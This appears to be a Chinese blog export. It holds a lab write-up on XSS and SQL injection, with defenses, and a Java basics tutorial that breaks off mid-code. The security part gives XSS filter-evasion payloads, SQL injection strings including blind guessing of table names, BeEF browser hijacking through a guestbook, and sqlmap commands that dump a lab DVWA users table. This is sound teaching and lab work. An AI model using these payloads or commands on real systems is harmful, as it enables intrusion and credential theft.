Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），浏览器会将Cookie的key&#x2F;value保存到某个目录下的文本文件内，下次请求同一网站时就发送该Cookie给服务器（前提是浏览器设置为启用Cookie）。Cookie名称和值可以由服务器端开发自己定义，对于JSP而言也可以直接写入jsessionid，这样服务器可以知道该用户是否为合法用户以及是否需要重新登录等。 4、XSS漏洞的分类 存储型 XSS：交互形Web应用程序出现后，用户就可以将一些数据信息存储到Web服务器上，例如像网络硬盘系统就允许用户将自己计算机上的文件存储到网络服务器上，然后与网络上的其他用户一起分享自己的文件信息。这种接收用户信息的Web应用程序由于在使用上更加贴近用户需求，使用灵活，使得其成为现代化Web领域的主导。在这些方便人性化的背后也带来了难以避免的安全隐患。 如果有某个Web应用程序的功能是负责将用户提交的数据存储到数据库中，然后在需要时将这个用户提交的数据再从数据库中提取出返回到网页中，在这个过程中，如果用户提交的数据中包含一个XSS攻击语句，一旦Web应用程序准备将这个攻击语句作为用户数据返回到网页中，那么所有包含这个回显信息的网页将全部受到XSS漏洞的影响，也就是说只要一个用户访问了这些网页中的任何一个，他都会遭受到来自该Web应用程序的跨站攻击。Web应用程序过于相信用户的数据，将其作为一个合法信息保存在数据库中，这等于是将一个定时炸弹放进了程序的内部，只要时机一到，这颗定时炸弹就会爆炸。这种因为存储外部数据而引发的XSS漏洞称为Web应用程序的Stored XSS漏洞，即存储型XSS漏洞。 存储型XSS漏洞广泛出现在允许Web用户自定义显示信息及允许Web用户上传文件信息的Web应用程序中，大部分的Web应用程序都属于此类。有一些Web应用程序虽然也属于此类，但是由于该Web应用程序只接受单个管理员的用户数据，而管理员一般不会对自己的Web应用程序做什么破坏，所以这种Web应用程序也不会遭到存储型XSS漏洞的攻击。 DOM-Based XSS漏洞： DOM是Document Object Model（文档对象模型）的缩写。根据W3C DOM规范（http://www.w.org.DOM/）,DOM是一种与浏览器、平台、语言无关的接口，使得网页开发者可以利用它来访问页面其他的标准组件。简单解释，DOM解决了Netscape的JavaScript和Microsoft的JScrtipt之间的冲突，给予Web设计师和开发者一个标准的方法，让他们来访问他们站点中的数据、脚本和表现层对象。 ​ 由于DOM有如此好的功能，大量的Web应用程序开发者在自己的程序中加入对DOM的支持，令人遗憾的是,Web应用程序开发者这种滥用DOM的做法使得Web应用程序的安全也大大降低，DOM-Based XSS正是在这样的环境下出现的漏洞。DOM-Based XSS漏洞与Stored XSS漏洞不同，因为他甚至不需要将XSS攻击语句存入到数据库中，直接在浏览器的地址栏中就可以让Web应用程序发生跨站行为。对于大多数的Web应用程序来说，这种类型的XSS漏洞是最容易被发现和利用的。 反射型XSS：仅对当次的页面访问产生影响。使得用户访问一个被攻击者篡改后的链接(包含恶意脚本)，用户访问该链接时，被植入的攻击脚本被用户浏览器执行，从而达到攻击目的。 5、XSS的防御 5.1基于特征的防御 XSS漏洞利用了Web页面的编写不完善，所以每一个漏洞所利用和针对的弱点都不尽相同。这就给XSS漏洞防御带来了困难：不可能以单一特征来概括所有XSS攻击。 传统XSS防御多采用特征匹配方式，在所有提交的信息中都进行匹配检查。对于这种类型的XSS攻击，采用的模式匹配方法一般会需要对“javascript”这个关键字进行检索，一旦发现提交信息中包含“javascript”，就认定为XSS攻击。这种检测方法的缺陷显而易见：黑客可以通过插入字符或完全编码的方式躲避检测。 （1） 在javascript中加入多个tab键，得到 IMG SRC&#x3D;”jav ascript:alert(‘XSS‘)” 。 （2） 在javascript中加入#x09编码字符，得到 IMG SRC&#x3D;”javascript:alert(‘XSS‘)” 。 （3） 在javascript中加入字符，得到 IMG SRC&#x3D;”javascript:alert(‘XSS‘)” 。 （4） 在javascript中的每个字符间加入回车换行符，得到 IMG SRC&#x3D;”j\\r\\na\\r\\nv\\r\\n\\r\\na\\r\\ns\\r\\nc\\r\\nr\\r\\ni\\r\\np\\r\\nt\\r\\n:alert(‘XSS‘)”。 （5） 对”javascript:alert(‘XSS‘)”采用完全编码，得到 IMGSRC&#x3D;#x6A#x61#x76#x61#x73#x63#x72#x69#x70#x74#x3A#x61#x6C#x65#x72#x74#x28#x27#x58#x53#x53#x27#x29。 上述方法都可以很容易的躲避基于特征的检测。而除了会有大量的漏报外，基于特征的还存在大量的误报可能：在上面的例子中，对”http://www.target.com/javascript/kkk.asp?id=2345&quot;这样一个URL，由于包含了关键字“javascript”，也将会触发报警。 基于代码修改的防御 还有一种方法就是从Web应用开发的角度来避免： （1） 对所有用户提交内容进行可靠的输入验证，包括对URL、查询关键字、HTTP头、POST数据等，仅接受指定长度范围内、采用适当格式、采用所预期的字符的内容来提交，对其他的一律过滤。 （2） 实现Session标记（session tokens）、CAPTCHA系统或者HTTP引用头检查，以防被攻击 。 SQL注入攻击 1、什么是SQL注入攻击 所谓SQL注入式攻击，就是攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。 2、为何会有SQL注入攻击 很多电子商务应用程序都使用数据库来存储信息。不论是产品信息，账目信息还是其它类型的数据，数据库都是Web应用环境中非常重要的环节。SQL命令就是前端Web和后端数据库之间的接口，使得数据可以传递到Web应用程序，也可以从其中发送出来。需要对这些数据进行控制，保证用户只能得到授权给他的信息。可是，很多Web站点都会利用用户输入的参数动态的生成SQL查询要求，攻击者通过在URL、表格域，或者其他的输入域中输入自己的SQL命令，以此改变查询属性，骗过应用程序，从而可以对数据库进行不受限的访问。 因为SQL查询经常用来进行验证、授权、订购、打印清单等，所以，允许攻击者任意提交SQL查询请求是非常危险的。通常，攻击者可以不经过授权，使用SQL输入从数据库中获取信息。 3． 何时使用SQL注入攻击 当Web应用向后端的数据库提交输入时，就可能遭到SQL注入攻击。可以将SQL命令人为的输入到URL、表格域，或者其他一些动态生成的SQL查询语句的输入参数中，完成上述攻击。因为大多数的Web应用程序都依赖于数据库的海量存储和相互间的逻辑关系（用户权限许可，设置等），所以，每次的查询中都会存在大量的参数。 4、MySQL简介 SQL是结构化查询语言的简称，它是全球通用的标准数据库查询语言，主要用于关系型数据的操作和管理，如增加记录，删除记录，更改记录，查询记录等，常用命令知识如表所示。 命令短语 功能 例句 select 用于查询记录和赋值 select i,j,k from A (i,j,k是表A中仅有的列名) select i&#x3D;’1’ (将i赋值为字符1) select* from A (含义同第一个例句) update 用于修改记录 update A set i&#x3D;2 where i&#x3D;1 (修改A表中i&#x3D;1的i值为2) insert 用于添加记录 insert into A values(1, ‘2’,3) (向A表中插入一条记录(i,j,k)对应为(1, ‘2’,3)) delete 用于删除记录 delete A where i&#x3D;2 (删除A标中i&#x3D;2的所有表项) from 用于指定操作的对象名（表，视图，数据库等的名称） 见 select where 用于指定查询条件 select *from A,B where A.name&#x3D;B.name and A.id&#x3D;B.id and 逻辑与 1&#x3D;1 and 2&lt;&#x3D;2 or 逻辑或 1&#x3D;1 or 1&gt;2 not 逻辑非 not 1&gt;1 &#x3D; 相等关系或赋值 见and、or、not &gt;,&gt;&#x3D;,&lt;,&lt;&#x3D; 关系运算符 与相等关系(‘&#x3D;’)的用法一致。 单引号(“’”) 用于指示字符串型数据 见select 逗号 分割相同的项 见select * 通配符所有 见select – 行注释 –这里的语句将不被执行! &#x2F;* *&#x2F; 块注释 &#x2F;* 这里的语句将不被执行! *&#x2F; 5、实施SQL注入攻击 5.1． 攻击一 任何输入，不论是Web页面中的表格域还是一条SQL查询语句中API的参数，都有可能遭受SQL注入的攻击。如果没有采取适当的防范措施，那么攻击只有可能在对数据库的设计和查询操作的结构了解不够充分时才有可能失败。 从SQL命令（更多的SQL命令见原理三）SELECT切入比较好。SELECT的使用格式如下： SELECT datacolumn,otherdatacolumn FROM databasetable WHERE conditionismet SQL在Web应用程序中的常见用途就是查询产品信息。应用程序通过CGI参数建立链接，在随后的查询中被引用。这些链接看起来通常像如下的样子： http://www.flowershop.com/store/itemdetail.asp?id=896 应用程序需要知道用户希望得到哪种产品的信息，所以浏览器会发送一个标识符，通常称为id。随后，应用程序动态的将其包含到SQL查询请求中，以便于从数据库中找到正确的行。查询语句通常的形式如下： SELECT name,picture,description,price FROM products WHERE id&#x3D;896 但是，用户可以在浏览器中轻易的修改信息。设想一下，作为某个Web站点的合法用户，在登入这个站点的时候输入了账号ID和密码。下面的SQL查询语句将返回合法用户的信息： SELECT accountdata FROM accountinfo WHERE accountid &#x3D; ‘account’ AND password &#x3D; ‘passwd’ 上面的SQL查询语句中唯一受用户控制的部分就是在单引号中的字符串。这些字符串就是用户在Web表格中输入的。Web应用程序自动生成了查询语句中的剩余部分。 常理来讲，其他用户在查看此账号信息时，他需要同时知道此账号ID和密码，但通过SQL输入的攻击者可以绕过全部的检查。 比如，当攻击者知道系统中存在一个叫做Tom的用户时，他会在SQL请求中使用注释符（双虚线–），然后将下面的内容输入到用户账号的表格域中。 Tom’– 这将会动态地生成如下的SQL查询语句： SELECT accountdata FROM accountinfo WHERE accountid&#x3D;’Tom’–’ AND password&#x3D;’passwd’ 由于“–”符号表示注释，随后的内容都被忽略，那么实际的语句就是： SELECT accountdata FROM accountinfo WHERE accountid &#x3D; ‘Tom’ 没有输入Tom的密码，却从数据库中查到了Tom用户的全部信息！注意这里所使用的语法，作为用户，可以在用户名之后使用单引号。这个单引号也是SQL查询请求的一部分，这就意味着，可以改变提交到数据库的查询语句结构。 在上面的案例中，查询操作本来应该在确保用户名和密码都正确的情况下才能进行的，而输入的注释符将一个查询条件移除了，这严重的危及到了查询操作的安全性。允许用户通过这种方式修改Web应用中的代码，是非常危险的。 5.2 攻击二 一般的应用程序对数据库进行的操作都是通过SQL语句进行，如查询一个表(A)中的一个num&#x3D;8的用户的所有信息，我们通过下面的语句来进行: select* from A where num&#x3D;8 对应页面地址可能有http://127.0.0.1/list.jsp?num=8。 一个复合条件的查询: select* from A where id&#x3D;8 and name&#x3D;’k’ 对应页面地址可能有http://127.0.0.1/aaa.jsp?id=8&amp;name=k。 通常数据库应用程序中where子句后面的条件部分都是在程序中按需要动态创建的，如下面使用的方法: String N&#x3D;request.getParameter(“id”); &#x2F;&#x2F;获得请求参数id的字符串值 String K&#x3D;request.getParameter(“name”);&#x2F;&#x2F;获得请求参数name的字符串值 String str&#x3D;”select* from A where id&#x3D;”+N+” and name&#x3D;&#39;“+K+”&#39;“;&#x2F;&#x2F;执行数据库操作 当N,K从前台获得的数据中存在像“’”,“and 1&#x3D;1”,“or 1&#x3D;1”,“–”就会出现具有特殊意义的SQL语句，当上面http://127.0.0.1/aaa.jsp?id=8&amp;name=k中的“id=8 –”时，在页面地址中可能会有如下的表示： http：&#x2F;&#x2F;127.0.0.1&#x2F;list.jsp?n&#x3D;8 – 上面的str变成了： select* from A where id&#x3D;8 – and name&#x3D;’k’ 熟悉SQL Server 的人一定明白上面语句的意义，很明显，–后面的条件and name&#x3D;’k’不会被执行，因为它被“–”注释掉了。 当上面的K&#x3D;”XXX&#39;or 1&#x3D;1”时（“&#39;”是“’”在字符串中的转义字符），在页面地址中会有如下的表示： http：&#x2F;&#x2F;127.0.0.1&#x2F;list.jsp?name&#x3D;XXX’or 1&#x3D;1 同样上面的语句变成了： select *from A where id&#x3D;8 and name&#x3D;’XXX’ or 1&#x3D;1. 这条语句会导致查询到所有用户的信息而不需要使用正确的id和name属性，虽然结果不会在页面上直接得到，但可以通过数据库的一些辅助函数间接猜解得到，下面猜解的例子能够说明SQL注入漏洞的危害性： 在SQL Server 2000中有user变量，用于存储当前登录的用户名，因此可以利用猜解它来获得当前数据库用户名，从而确定当前数据库的操作权限是否为最高用户权限，在一个可以注入的页面请求地址后面加上下面的语句，通过修改数值范围，截取字符的位置，并重复尝试，就可以猜解出当前数据库连接的用户名： and (SubString(user,1,1)&gt; 65 and SubString(user,1,1)&lt;90) 如果正常返回，则说明当前数据库操作用户帐户名的前一个字符在A~Z的范围内，逐步缩小猜解范围，就可以确定猜解内容。SubString（）是SQL Server 2000 数据库中提供的系统函数，用于获取字符字符串的子串。65，和90分别是字母A和Z的ascii码。 再有，在数据库中查找用户表（需要一定的数据库操作权限），可以使用下面的复合语句： and (select count(*) from sysobjects where xtype&#x3D;’u’)&gt;n n取1，2，……,通过上面形式的语句可以判断数据库中有多少用户表。 可以通过and(substring((select top 1 name from sysobjects where xtype &#x3D;’u’),1,1)&#x3D;字符)的形式逐步猜解出表名。 利用构建的SQL注入短语，可以查询出数据库中的大部分信息，只要构建的短语能够欺骗被注入程序按你的意图执行，并能够正确分析程序返回的现象，注入攻击者就可以控制整个系统。 基于网页地址的SQL注入只是利用了页面地址携带参数这一性质，来构建特殊sql语句以实现对Web应用程序的恶意操作（查询，修改，添加等）。事实上SQL注入不一定要只针对浏览器地址栏中的url。任何一个数据库应用程序对前台传入数据的处理不当都会产生SQL注入漏洞，如一个网页表单的输入项，应用程序中文本框输的入信息等。 6、防范SQL注入方法汇总 Web开发人员认为SQL查询请求是可以信赖的操作，但事实却是恰恰相反的，他们没有考虑到用户可以控制这些查询请求的参数，并且可以在其中输入符合语法的SQL命令。 解决SQL注入问题的方法再次归于对特殊字符的过滤，包括URL、表格域以及用户可以控制的任何输入数据。与SQL语法相关的特殊字符以及保留字应当在查询请求提交到数据库之前进行过滤或者被去除（例如跟在反斜号后面的单引号）。过滤操作最好在服务器端进行。将过滤操作的代码插入到客户机端执行的HTML中，实在是不明智的，因为攻击者可以修改验证程序。防止破坏的唯一途径就是在服务器端执行过滤操作。避免这种攻击更加可靠的方式就是使用存储过程。具体可以通过以下若干方法来防范SQL注入攻击。 （1） 对前台传入参数按的数据类型，进行严格匹配（如查看描述数据类型的变量字符串中，是否存在字母）。 （2） 对于单一变量（如上面的K，N）如果有必要，过滤或替换掉输入数据中的空格。 （3） 将一个单引号（“’”），替换成两个连续的单引号（“’’”）。 （4） 限制输入数据的有效字符种类，排除对数据库操作有特殊意义的字符（如“–”）。 （5） 限制表单或查询字符串输入的长度。 （6） 用存储过程来执行所有的查询。 （7） 检查提取数据的查询所返回的记录数量。如果程序只要求返回一个记录，但实际返回的记录却超过一行，那就当作出错处理。 （8） 将用户登录名称、密码等数据加密保存。加密用户输入的数据，然后再将它与数据库中保存的数据比较，这相当于对用户输入的数据进行了“消毒”处理，用户输入的数据不再对数据库有任何特殊的意义，从而也就防止了攻击者注入SQL命令。 总而言之，就是要尽可能地限制用户可以存取的数据总数。另外，对用户要按“最小特权”安全原则分配权限，即使发生了SQL注入攻击，结果也被限制在那些可以被正常访问到的数据中。 实验步骤XSS部分：利用Beef劫持被攻击者客户端浏览器。 实验环境搭建。 角色：留言簿网站。存在XSS漏洞；（IIS或Apache、guestbook搭建） 攻击者：Kali（使用beEF生成恶意代码，并通过留言方式提交到留言簿网站）； 被攻击者：访问留言簿网站，浏览器被劫持。 1、利用AWVS扫描留言簿网站（安装见参考文档0.AWVS安装与使用.docx），发现其存在XSS漏洞，截图。 2、 Kali使用beef生成恶意代码，截图。 3、访问http:&#x2F;&#x2F;留言簿网站&#x2F;message.asp;将以下恶意代码写入网站留言板， ，截图。 4、管理员登录login.htm，账号密码均为admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在beff中的配置截图。 5、回答问题：实验中XSS攻击属于哪种类型？回答：存储型 SQL注入部分：DVWA+SQLmap+Mysql注入实战** 实验环境搭建。启动Metasploitable2虚拟机。 1、注入点发现。首先肯定是要判断是否有注入漏洞。 在输入框输入1，返回 ID: 1 First name: admin Surname: admin 返回正常； 再次输入1’，报错，返回 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’1’’’ at line 1 此时可以断定有SQL注入漏洞， http://IP地址/DVWA-master/vulnerabilities/sqli/?id=22&amp;Submit=Submit# 下面利用SQLMap进行注入攻击。将DVWA安全级别设置为最低； 2、枚举当前使用的数据库名称和用户名。你输入的命令： 1sqlmap -u &#x27;http://192.168.154.142/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27; --cookie=&quot;security=low; PHPSESSID=4f0c98e2c7d0f376e76c7be5f0ec97a2&quot; -p id --current-db --current-user Sqlmap输出截图。 3、枚举数据库用户名和密码你输入的命令： 1sqlmap -u &#x27;http://192.168.154.142/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27; --cookie=&quot;security=low; PHPSESSID=4f0c98e2c7d0f376e76c7be5f0ec97a2&quot; -p id --users --password ​ Sqlmap输出截图。 4、枚举数据库–dbs：枚举当前数据库 你输入的命令： 1sqlmap -u &#x27;http://192.168.154.142/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27; --cookie=&quot;security=low; PHPSESSID=4f0c98e2c7d0f376e76c7be5f0ec97a2&quot; -p id --dbs Sqlmap输出截图。 5、枚举数据库和指定数据库的数据表 -D 数据库名：指定数据库 –tables：枚举指定数据库的所有表 你输入的命令： 1sqlmap -u &#x27;http://192.168.154.142/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27; --cookie=&quot;security=low; PHPSESSID=4f0c98e2c7d0f376e76c7be5f0ec97a2&quot; -p id -D dvwa --tables ​ Sqlmap输出截图。 6、获取指定数据库和表中所有列的信息-D：指定的数据库 -T：指定数据库中的数据表 –columns：获取列的信息 你输入的命令： 1sqlmap -u &#x27;http://192.168.154.142/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27; --cookie=&quot;security=low; PHPSESSID=4f0c98e2c7d0f376e76c7be5f0ec97a2&quot; -p id -D dvwa -T users --columns ​ Sqlmap输出截图。 7、枚举指定数据表中的所有用户名与密码,并down到本地。-C：枚举数据表中的列 –dump：存储数据表项 你输入的命令： 1sqlmap -u &#x27;http://192.168.154.142/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27; --cookie=&quot;security=low; PHPSESSID=4f0c98e2c7d0f376e76c7be5f0ec97a2&quot; -p id -D dvwa -T users -C user,password --dump ​ Sqlmap输出截图。 查看down到本地的用户名与密码，截图。（提示带.的文件夹为隐藏，在图形命令下，用文件浏览器打开文件夹，按下ctrl+h组合键可显示隐藏文件合文件夹，再按一次取消显示。）","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"网络渗透测试","slug":"安全/网络渗透测试","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"实验","slug":"安全/网络渗透测试/实验","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E9%AA%8C/"}],"tags":[{"name":"实验","slug":"实验","permalink":"http://example.com/tags/%E5%AE%9E%E9%AA%8C/"}]},{"title":"Java高级应用","slug":"java高级应用","date":"2023-12-23T05:52:19.570Z","updated":"2024-01-12T04:56:47.217Z","comments":true,"path":"2023/12/23/java高级应用/","permalink":"http://example.com/2023/12/23/java%E9%AB%98%E7%BA%A7%E5%BA%94%E7%94%A8/","excerpt":"","text":"异常处理1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950//try-catch-finaly/*Catch 语句包含要捕获异常类型的声明。当保护代码块中发生一个异常时，try 后面的 catch 块就会被检查。如果发生的异常包含在 catch 块中，异常会被传递到该 catch 块，这和传递一个参数到方法是一样。finally 关键字用来创建在 try 代码块后面执行的代码块。无论是否发生异常，finally 代码块中的代码总会被执行。*/public class ExcepTest&#123; public static void main(String args[])&#123; int a[] = new int[2]; try&#123; System.out.println(&quot;Access element three :&quot; + a[3]); &#125;catch(ArrayIndexOutOfBoundsException e)&#123; System.out.println(&quot;Exception thrown :&quot; + e); //Exception thrown :java.lang.ArrayIndexOutOfBoundsException: 3 &#125; finally&#123; a[0] = 6; System.out.println(&quot;First element value: &quot; +a[0]); //First element value: 6 System.out.println(&quot;The finally statement is executed&quot;); //The finally statement is executed &#125; &#125;&#125;//throws/throw /*在Java中， throw 和 throws 关键字是用于处理异常的。throw 关键字用于在代码中抛出异常，而 throws 关键字用于在方法声明中指定可能会抛出的异常类型。throw 关键字用于在当前方法中抛出一个异常。通常情况下，当代码执行到某个条件下无法继续正常执行时，可以使用 throw 关键字抛出异常，以告知调用者当前代码的执行状态。throws 关键字用于在方法声明中指定该方法可能抛出的异常。当方法内部抛出指定类型的异常时，该异常会被传递给调用该方法的代码，并在该代码中处理异常*///在方法中判断 num 是否小于 0，如果是，则抛出一个 IllegalArgumentException 异常。public void checkNumber(int num) &#123; if (num &lt; 0) &#123; throw new IllegalArgumentException(&quot;Number must be positive&quot;); &#125;&#125;//当 readFile 方法内部发生 IOException 异常时，会将该异常传递给调用该方法的代码。在调用该方法的代码中，必须捕获或声明处理 IOException 异常。public void readFile(String filePath) throws IOException &#123; BufferedReader reader = new BufferedReader(new FileReader(filePath)); String line = reader.readLine(); while (line != null) &#123; System.out.println(line); line = reader.readLine(); &#125; reader.close();&#125; 多线程12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364//通过继承Thread来创建线程class ThreadDemo extends Thread &#123; private Thread t; private String threadName; ThreadDemo( String name) &#123; threadName = name; System.out.println(&quot;Creating &quot; + threadName ); &#125; public void run() &#123; System.out.println(&quot;Running &quot; + threadName ); try &#123; for(int i = 4; i &gt; 0; i--) &#123; System.out.println(&quot;Thread: &quot; + threadName + &quot;, &quot; + i); // 让线程睡眠一会 Thread.sleep(50); &#125; &#125;catch (InterruptedException e) &#123; System.out.println(&quot;Thread &quot; + threadName + &quot; interrupted.&quot;); &#125; System.out.println(&quot;Thread &quot; + threadName + &quot; exiting.&quot;); &#125; public void start () &#123; System.out.println(&quot;Starting &quot; + threadName ); if (t == null) &#123; t = new Thread (this, threadName); t.start (); &#125; &#125;&#125; public class TestThread &#123; public static void main(String args[]) &#123; ThreadDemo T1 = new ThreadDemo( &quot;Thread-1&quot;); T1.start();//调用start()和run() ThreadDemo T2 = new ThreadDemo( &quot;Thread-2&quot;); T2.start(); &#125; &#125;/*编译以上程序运行结果如下：Creating Thread-1Starting Thread-1Creating Thread-2Starting Thread-2Running Thread-1Thread: Thread-1, 4Running Thread-2Thread: Thread-2, 4Thread: Thread-1, 3Thread: Thread-2, 3Thread: Thread-1, 2Thread: Thread-2, 2Thread: Thread-1, 1Thread: Thread-2, 1Thread Thread-1 exiting.Thread Thread-2 exiting.*/ 常用类和apiString123456789101112131415//String 类来创建和操作字符串。//创建String str = &quot;Run&quot;;String str2=new String(&quot;Run&quot;); public static void main(String args[])&#123; char[] helloArray = &#123; &#x27;r&#x27;, &#x27;u&#x27;, &#x27;n&#x27;&#125;; String helloString = new String(helloArray); System.out.println( helloString );//run &#125;&#125;//连接字符串string1.concat(string2); StringBuffer 和 StringBuilder12345678910111213141516171819202122232425262728293031323334353637383940/*当对字符串进行修改的时候，需要使用 StringBuffer 和 StringBuilder 类。和 String 类不同的是，StringBuffer 和 StringBuilder 类的对象能够被多次的修改，并且不产生新的未使用对象。在使用 StringBuffer 类时，每次都会对 StringBuffer 对象本身进行操作，而不是生成新的对象，所以如果需要对字符串进行修改推荐使用 StringBuffer。StringBuilder 类在 Java 5 中被提出，它和 StringBuffer 之间的最大不同在于 StringBuilder 的方法不是线程安全的（不能同步访问）。由于 StringBuilder 相较于 StringBuffer 有速度优势，所以多数情况下建议使用 StringBuilder 类。*/public class RunTest&#123; public static void main(String args[])&#123; StringBuilder sb = new StringBuilder(10); sb.append(&quot;Runoob..&quot;); System.out.println(sb); sb.append(&quot;!&quot;); System.out.println(sb); sb.insert(8, &quot;Java&quot;); System.out.println(sb); sb.delete(5,8); System.out.println(sb); &#125;&#125;/*以上实例编译运行结果如下：Runoob..Runoob..!Runoob..Java!RunooJava!*/public class Test&#123; public static void main(String args[])&#123; StringBuffer sBuffer = new StringBuffer(&quot;博客：&quot;); sBuffer.append(&quot;NCQian124&quot;); sBuffer.append(&quot;.github&quot;); sBuffer.append(&quot;.io&quot;); System.out.println(sBuffer); &#125;&#125; 日期时间1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283//Date 类来封装当前的日期和时间。 Date 类提供两个构造函数来实例化 Date 对象。//第一个构造函数使用当前日期和时间来初始化对象。Date( ) //第二个构造函数接收一个参数，该参数是从 1970 年 1 月 1 日起的毫秒数。Date(long millisec) //获取当前日期时间 public class DateDemo &#123; public static void main(String[] args) &#123; // 初始化 Date 对象 Date date = new Date(); // 使用 toString() 函数显示日期时间 System.out.println(date.toString()); &#125;&#125;/*日期比较Java使用以下三种方法来比较两个日期：使用 getTime() 方法获取两个日期（自1970年1月1日经历的毫秒数值），然后比较这两个值。使用方法 before()，after() 和 equals()。例如，一个月的12号比18号早，则 new Date(99, 2, 12).before(new Date (99, 2, 18)) 返回true。使用 compareTo() 方法，它是由 Comparable 接口定义的，Date 类实现了这个接口。*///使用 SimpleDateFormat 格式化日期public class DateDemo &#123; public static void main(String[] args) &#123; Date dNow = new Date( ); SimpleDateFormat ft = new SimpleDateFormat (&quot;yyyy-MM-dd hh:mm:ss&quot;); System.out.println(&quot;当前时间为: &quot; + ft.format(dNow)); &#125;&#125;//解析字符串为时间//SimpleDateFormat 类有一些附加的方法，特别是parse()，它试图按照给定的SimpleDateFormat 对象的格式化存储来解析字符串。public class DateDemo &#123; public static void main(String[] args) &#123; SimpleDateFormat ft = new SimpleDateFormat (&quot;yyyy-MM-dd&quot;); String input = args.length == 0 ? &quot;1818-11-11&quot; : args[0]; System.out.print(input + &quot; Parses as &quot;); Date t; try &#123; t = ft.parse(input); System.out.println(t); &#125; catch (ParseException e) &#123; System.out.println(&quot;Unparseable using &quot; + ft); &#125; &#125;&#125;//Calendar设置和获取日期数据的特定部分Calendar c = Calendar.getInstance();//默认是当前日期//创建一个代表2009年6月12日的Calendar对象Calendar c1 = Calendar.getInstance();c1.set(2009, 6 - 1, 12);//把c1对象的日期加上10，也就是c1也就表示为10天后的日期，其它所有的数值会被重新计算c1.add(Calendar.DATE, 10);Calendar c1 = Calendar.getInstance();// 获得年份int year = c1.get(Calendar.YEAR);// 获得月份int month = c1.get(Calendar.MONTH) + 1;// 获得日期int date = c1.get(Calendar.DATE);// 获得小时int hour = c1.get(Calendar.HOUR_OF_DAY);// 获得分钟int minute = c1.get(Calendar.MINUTE);// 获得秒int second = c1.get(Calendar.SECOND);// 获得星期几（注意（这个与Date类是不同的）：1代表星期日、2代表星期1、3代表星期二，以此类推）int day = c1.get(Calendar.DAY_OF_WEEK); Comparable接口1234567891011121314151617181920212223242526272829303132333435363738394041424344454647//1个类的对象支持比较(排序), 就必须实现Comparable接口./*Comparable 接口内部只有1个要重写的关键的方法.就是int compareTo(T o)这个方法返回1个Int数值, 例如 i = x.compareTo(y)如果i=0, 也表明对象x与y排位上是相等的(并非意味x.equals(y) = true, 但是jdk api上强烈建议这样处理)如果返回数值i&gt;0 则意味者, x &gt; y啦， 反之若i&lt;0则 意味x &lt; y*/import java.util.ArrayList;import java.util.Collections; class Student implements Comparable&#123; private String name; private int ranking; public Student(String name, int ranking)&#123; this.name = name; this.ranking = ranking; &#125; public String toString()&#123; return this.name + &quot;:&quot; + this.ranking; &#125; public int compareTo(Object o)&#123; Student s = (Student)(o); return this.ranking - s.ranking; &#125;&#125; public class Compare2&#123; public static void f()&#123; ArrayList arr = new ArrayList(); arr.add(new Student(&quot;Jack&quot;,10)); arr.add(new Student(&quot;Bill&quot;,23)); arr.add(new Student(&quot;Rudy&quot;,7)); System.out.println(arr); //[java] [Jack:10, Bill:23, Rudy:7] Collections.sort(arr); System.out.println(arr); //[java] [Rudy:7, Jack:10, Bill:23] &#125; &#125; Comparator接口123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147//1. 排序，需要比较两个对象谁排在前谁排在后（排序也可以让类实现Comparable接口，实现后该类的实例也具有排序能力）。public class SortTest &#123; class Dog&#123; public int age; public String name; public Dog(int age, String name) &#123; super(); this.age = age; this.name = name; &#125; @Override public String toString() &#123; return &quot;Dog [age=&quot; + age + &quot;, name=&quot; + name + &quot;]&quot;; &#125; &#125; public static void main(String[] args) &#123; List&lt;Dog&gt; list= new ArrayList&lt;&gt;(); list.add(new SortTest().new Dog(5, &quot;DogA&quot;)); list.add(new SortTest().new Dog(6, &quot;DogB&quot;)); list.add(new SortTest().new Dog(7, &quot;DogC&quot;)); Collections.sort(list, new Comparator&lt;Dog&gt;() &#123; @Override public int compare(Dog o1, Dog o2) &#123; return o2.age - o1.age; &#125; &#125;); System.out.println(&quot;给狗狗按照年龄倒序：&quot;+list); Collections.sort(list, new Comparator&lt;Dog&gt;() &#123; @Override public int compare(Dog o1, Dog o2) &#123; return o1.name.compareTo(o2.name); &#125; &#125;); System.out.println(&quot;给狗狗按名字字母顺序排序：&quot;+list); &#125;&#125;//2. 分组，需要比较两个对象是否是属于同一组。package com.java.demo;import java.util.ArrayList;import java.util.Comparator;import java.util.List;public class GroupTest &#123; class Apple &#123; public String color; public int weight; public Apple(String color, int weight) &#123; super(); this.color = color; this.weight = weight; &#125; @Override public String toString() &#123; return &quot;Apple [color=&quot; + color + &quot;, weight=&quot; + weight + &quot;]&quot;; &#125; &#125; public static &lt;T&gt; List&lt;List&lt;T&gt;&gt; divider(Collection&lt;T&gt; datas, Comparator&lt;? super T&gt; c) &#123; List&lt;List&lt;T&gt;&gt; result = new ArrayList&lt;List&lt;T&gt;&gt;(); for (T t : datas) &#123; boolean isSameGroup = false; for (int j = 0; j &lt; result.size(); j++) &#123; if (c.compare(t, result.get(j).get(0)) == 0) &#123; isSameGroup = true; 